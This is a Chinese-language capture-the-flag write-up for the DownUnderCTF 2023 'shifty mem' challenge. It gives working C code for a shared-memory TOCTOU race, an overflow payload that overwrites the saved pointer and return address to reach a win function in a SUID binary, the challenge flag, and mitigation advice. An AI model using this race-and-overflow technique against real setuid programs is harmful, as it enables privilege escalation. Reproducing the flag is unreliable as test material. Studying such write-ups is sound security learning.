# DownUnderCTF 2023 shifty mem Writeup

## 题目简述

SUID 程序创建一个全局可读写的 POSIX 共享内存对象，客户端通过结构体提交字符串长度和位移量。程序先检查长度不大于 128，再把共享内存中的长度传给栈上 128 字节输出缓冲区。检查和使用之间没有同步，形成共享内存 TOCTOU 竞态。

## 解题过程

请求结构中的 `len` 是 `unsigned char`，因此 `len < 0` 永远为假。攻击进程在共享内存仍存在的 10 ms 窗口内打开并映射它，然后不断切换：

```c
while (1) {
    shm_req->len = 1;    // 让边界检查通过
    shm_req->len = 176;  // 让 shift_str 使用越界长度
}
```

当目标进程第一次读取到 1、后续读取到 176 时，`shift_str` 会向 `main` 的 `out[128]` 写入 176 字节并追加 NUL。官方二进制中的关键覆盖偏移为：

```text
out + 136 : main 保存的 shm_req 指针
out + 168 : main 的保存返回地址
```

payload 在偏移 136 写入可读写且内容为零的地址 `0x404800`，避免溢出后主循环继续解引用损坏指针时崩溃；在偏移 168 写入非 PIE 的 `win` 地址 `0x40124c`。

```c
memset(shm_req->buf, 'A', 176);
*(unsigned long *)(shm_req->buf + 136) = 0x404800;
*(unsigned long *)(shm_req->buf + 168) = 0x40124c;
```

溢出后，下一轮从伪造指针读取到 `len == 0`，`main` 正常返回并跳到 `win()`。由于程序具有 SUID 权限，`win` 能读取：

```text
DUCTF{r4c1ng_sh4r3d_m3mory_t0_th3_f1nish_flag}
```

## 方法总结

共享内存中的字段随时可能被另一进程改变，不能先验证一次再重复读取。应把请求复制到私有内存后只使用快照，或用原子状态、序列号和锁建立完整提交协议；共享对象也不应以 `0777` 权限暴露。`unsigned char` 上无意义的负数检查进一步掩盖了问题。
